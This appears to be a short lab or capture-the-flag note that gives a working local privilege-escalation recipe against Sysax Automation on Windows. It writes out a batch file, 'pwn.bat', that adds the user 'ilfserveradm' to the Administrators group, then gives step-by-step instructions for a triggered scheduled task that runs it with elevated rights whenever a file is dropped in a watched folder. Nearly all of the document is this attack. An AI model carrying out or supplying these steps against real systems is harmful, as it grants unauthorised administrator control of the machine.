# SysaxAutomation - Privilege Escalation

Create `pwn.bat` in `C:\Users\ilfserveradm\Documents`:

```bat
net localgroup administrators ilfserveradm /add
```

Steps:

1. Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
2. Select `Setup Scheduled/Triggered Tasks`
3. Add task (Triggered)
4. Update folder to monitor: `C:\Users\ilfserveradm\Documents`
5. Check `Run task if a file is added to the monitor folder or subfolder(s)`
6. Choose `Run any other Program` and select `C:\Users\ilfserveradm\Documents\pwn.bat`
7. Uncheck `Login as the following user to run task`
8. Click `Finish` then `Save`

To trigger: create a new .txt file in `C:\Users\ilfserveradm\Documents`. The `ilfserveradm` user gets added to `Administrators` group.

[image]
